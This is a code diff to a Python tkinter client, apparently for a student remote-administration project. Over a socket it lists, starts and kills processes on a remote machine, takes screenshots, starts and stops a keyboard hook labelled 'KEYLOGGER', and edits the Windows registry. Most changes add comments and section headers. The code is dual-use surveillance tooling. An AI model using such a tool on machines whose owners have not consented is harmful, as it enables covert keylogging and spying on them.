@@ -1,16 +1,15 @@
+#=============================== ADD LIBRARIES ===============================#
 from tkinter import *
 from tkinter import messagebox
 from tkinter import filedialog
 from tkinter import ttk
 from tkinter import scrolledtext
 from PIL import ImageTk, Image
-import pyautogui
-import os
 import socket
-import win32api
+
+
 
 #=============================== Define control code ===============================#
-
 QUIT             =  '0'
 PROCESS_RUNNING  =  '1'
 APP_RUNNING      =  '2'
@@ -20,20 +19,40 @@ KEYSTROKE        =  '5'
 EDIT_REGISTRY    =  '6'
 EXIT             =  '7'
 
-KILL             =  'K'
-START            =  'S'
-VIEW             =  'V'
-HOOK			 =  'H'
-UNHOOK			 =  'U'
-PRINT            =  'P'
-CONTENT          =  'C'
-EDIT             =  'E'
 
-#=============================== +++++++++++++++++++++++++ ===============================#
+CONTENT          =  'C'          # Send content of reg file from client
+                                 #_____________________________________________________________________
+EDIT             =  'E'          # Include: get value, set value, delete value, create key, delete key
+                                 #_____________________________________________________________________
+HOOK			 =  'H'          # Start hooking keyboard
+                                 #_____________________________________________________________________
+KILL             =  'K'          # Kill a process or an application
+                                 #_____________________________________________________________________
+PRINT            =  'P'          # Print hooked key
+                                 #_____________________________________________________________________
+START            =  'S'          # Start a process or an application
+                                 #_____________________________________________________________________
+TAKE             =  'T'          # Take a screenshot
+                                 #_____________________________________________________________________
+UNHOOK			 =  'U'          # Stop hooking keyboard
+                                 #_____________________________________________________________________
+VIEW             =  'V'          # View list processes or applications
 
+
+
+#============================== PORT ==============================#
 PORT             =  12225
 
-#=============================== Declare class of function ===============================#
+
+
+#===============================                            ===============================#
+#===============================                            ===============================#
+#=============================== DEFINE CLASS FOR EACH TASK ===============================#
+#===============================                            ===============================#
+#===============================                            ===============================#
+
+
+#=============================== PROCESSING ===============================#
 class Process(Toplevel):
     def __init__(self,client,master = None):
         super().__init__(master)
@@ -80,12 +99,17 @@ class Process(Toplevel):
         self.tree.heading("2",text = "ID Process")
         self.tree.heading("3",text = "Count Thread")
         self.protocol("WM_DELETE_WINDOW", self.on_closing)
+        pass
 
     def kill(self,id_input):
         pid = id_input.get()
         if pid != "":
+
+            # Send control code
             self.client.sendall(bytes(KILL,'utf8'))
             self.client.recv(1)
+
+            # Send ID process
             self.client.sendall(bytes(pid,'utf8'))
             if self.client.recv(1).decode('utf8') == '0':
                 messagebox.showerror("ERROR","Error!")
@@ -93,7 +117,6 @@ class Process(Toplevel):
                 messagebox.showinfo("INFO","Success!")
             self.on_closing
         pass
-
 
     def kill_dialog(self):
         t = Toplevel()
@@ -107,13 +130,15 @@ class Process(Toplevel):
         pass
 
     def view(self):
-        for i in self.tree.get_children():
-            self.tree.delete(i)
+        self.delete()
 
+        # Send control code
         self.client.sendall(bytes(VIEW,'utf8'))
+
         temp = []
         while True:
             pid = self.client.recv(2048).decode("utf8")
+            # First check if end of list
             if pid == '__END__':
                 break
             self.client.sendall(bytes('1',"utf8"))
@@ -124,6 +149,8 @@ class Process(Toplevel):
             threadcount = self.client.recv(2048).decode('utf8')
             self.client.sendall(bytes('1','utf8'))
             temp.append((name,pid,threadcount))
+
+        # Add to list view
         for item in temp:
             self.tree.insert('','end',values = (item))
         pass
@@ -136,8 +163,10 @@ class Process(Toplevel):
     def start(self,id_input):
         name = id_input.get()
         if name != "":
+            # Send control code
             self.client.sendall(bytes(START,'utf8'))
             self.client.recv(1)
+            # Send name of process to start
             self.client.sendall(bytes(name,'utf8'))
             if self.client.recv(1).decode('utf8') == '0':
                 messagebox.showerror("ERROR","Error!")
@@ -169,7 +198,7 @@ class Process(Toplevel):
             func.destroy()
         pass
         
-
+#=============================== APPLICATION ===============================#
 class ListApp(Toplevel):
     def __init__(self, client,master = None):
         super().__init__(master)
@@ -216,12 +245,17 @@ class ListApp(Toplevel):
         self.tree.heading("2",text = "ID Application")
         self.tree.heading("3",text = "Count Thread")
         self.protocol("WM_DELETE_WINDOW", self.on_closing)
+        pass
 
     def kill(self,id_input):
         pid = id_input.get()
         if pid != "":
+            
+            # Send control code
             self.client.sendall(bytes(KILL,'utf8'))
             self.client.recv(1)
+
+            # Send ID process of application
             self.client.sendall(bytes(pid,'utf8'))
             if self.client.recv(1).decode('utf8') == '0':
                 messagebox.showerror("ERROR","Error!")
@@ -242,13 +276,16 @@ class ListApp(Toplevel):
         pass
 
     def view(self):
-        for i in self.tree.get_children():
-            self.tree.delete(i)
+        self.delete()
 
+        # Send control code
         self.client.sendall(bytes(VIEW,'utf8'))
+
         temp = []
         while True:
             pid = self.client.recv(2048).decode("utf8")
+            
+            # Check end of list
             if pid == '__END__':
                 break
             self.client.sendall(bytes('1',"utf8"))
@@ -271,8 +308,12 @@ class ListApp(Toplevel):
     def start(self,id_input):
         name = id_input.get()
         if name != "":
+
+            # Send control code
             self.client.sendall(bytes(START,'utf8'))
             self.client.recv(1)
+
+            # Send name application to start
             self.client.sendall(bytes(name,'utf8'))
             if self.client.recv(1).decode('utf8') == '0':
                 messagebox.showerror("ERROR","Error!")
@@ -304,6 +345,7 @@ class ListApp(Toplevel):
             func.destroy()
         pass
 
+#=============================== SCREEN CAPTURE ===============================#
 class Pic(Toplevel):
     def __init__(self,client,master = None):
         super().__init__(master)
@@ -333,19 +375,26 @@ class Pic(Toplevel):
     def take(self):
         for widget in self.fr1.winfo_children():
             widget.destroy()
-        self.client.sendall(bytes(str('1'),'utf8'))
+        
+        # Send control code
+        self.client.sendall(bytes(TAKE,'utf8'))
 
+        # Size of pic (bytes)
         sizef = int(self.client.recv(2048).decode('utf8'))
         self.client.sendall(bytes(str('1'),'utf8'))
 
+        # Width of pic
         w = int(self.client.recv(2048).decode('utf8'))
         self.client.sendall(bytes(str('1'),'utf8'))
 
+        # Height of pic
         h = int(self.client.recv(2048).decode('utf8'))
         self.client.sendall(bytes(str('1'),'utf8'))
 
+        # Data, it's mean binary code of pic 
         data = self.client.recv(sizef)
 
+        # Convert binary file to picture
         self.img = Image.frombytes(mode = 'RGB',size=(w,h), data=data)
         cre_img = self.img.resize((550,400),Image.ANTIALIAS)
         
@@ -376,6 +425,7 @@ class Pic(Toplevel):
             func.destroy()       
         pass
 
+#=============================== KEYLOGGER ===============================#
 class Keylog(Toplevel):
     def __init__(self,client,master =None):
         super().__init__(master)
@@ -414,14 +464,20 @@ class Keylog(Toplevel):
         self.protocol("WM_DELETE_WINDOW", self.on_closing)
 
     def hook(self):
+        
+        # Dont request hooking if it is hooking
         if not self.is_hooking:
             self.is_hooking = True
+
+            # Send control code
             self.client.sendall(bytes(HOOK,'utf8'))
         pass
 
     def unhook(self):
         if self.is_hooking:
             self.is_hooking = False
+
+            # Send control code
             self.client.sendall(bytes(UNHOOK,'utf8'))
         pass
 
@@ -459,6 +515,7 @@ class Keylog(Toplevel):
             func.destroy()
         pass
 
+#=============================== REGISTRY ===============================#
 class Registry(Toplevel):
     def __init__(self,client,master = None):
         super().__init__(master)
@@ -533,10 +590,14 @@ class Registry(Toplevel):
         self.protocol("WM_DELETE_WINDOW", self.on_closing)
 
     def loadContent(self):
+
+        # Get path to reg file
         file = filedialog.askopenfilename(title = "Select file",filetypes = (("reg files","*.reg"),))
         if not file or file == '':
             return
         try:
+
+            # Try to open reg file and show to window
             self.path.delete('0','end')
             self.path.insert(0,file)
             f = open(file)
@@ -548,11 +609,19 @@ class Registry(Toplevel):
         pass
 
     def sendContent(self):
+
+        # Send control code
         self.client.sendall(bytes(CONTENT,"utf8"))
+
+        # Get content of reg file after edit
         s = self.content.get('1.0', 'end-1c')
         print(s)
+
+        # Then send it to server
         self.client.sendall(bytes(str(s),'utf8'))
         self.client.recv(1)
+
+        # Announcement from server
         announce = self.client.recv(1).decode('utf8')
         if announce == '1':
             messagebox.showinfo('Info','Edit successfully!')
@@ -560,6 +629,7 @@ class Registry(Toplevel):
             messagebox.showinfo('Info','Edit failed!')
         pass
 
+    # This function to display widget suitable for each option
     def chooseAction(self,eventObject):
         action = self.option.get()
         print(action)
@@ -577,6 +647,7 @@ class Registry(Toplevel):
             self.data_type.pack(side = LEFT ,padx = 10,pady = 10)
         pass
 
+    # Send request from client with regedit like get, set, delete value or create, delete key
     def sendToEdit(self):
         self.client.sendall(bytes(EDIT,'utf8'))
         
@@ -629,8 +700,11 @@ class Registry(Toplevel):
 
 
 
-
-        
+#===============================                            ===============================#
+#===============================                            ===============================#
+#=============================== MAIN WINDOW TO CONTROL ALL ===============================#
+#===============================                            ===============================#
+#===============================                            ===============================#
 
 class App(Tk):
     def __init__(self):
@@ -803,6 +877,11 @@ class App(Tk):
         pass
 
 
+#===============================                            ===============================#
+#===============================                            ===============================#
+#===============================        MAIN FUNCTION       ===============================#
+#===============================                            ===============================#
+#===============================                            ===============================#
 if __name__ == "__main__":
     app = App()
     app.mainloop()
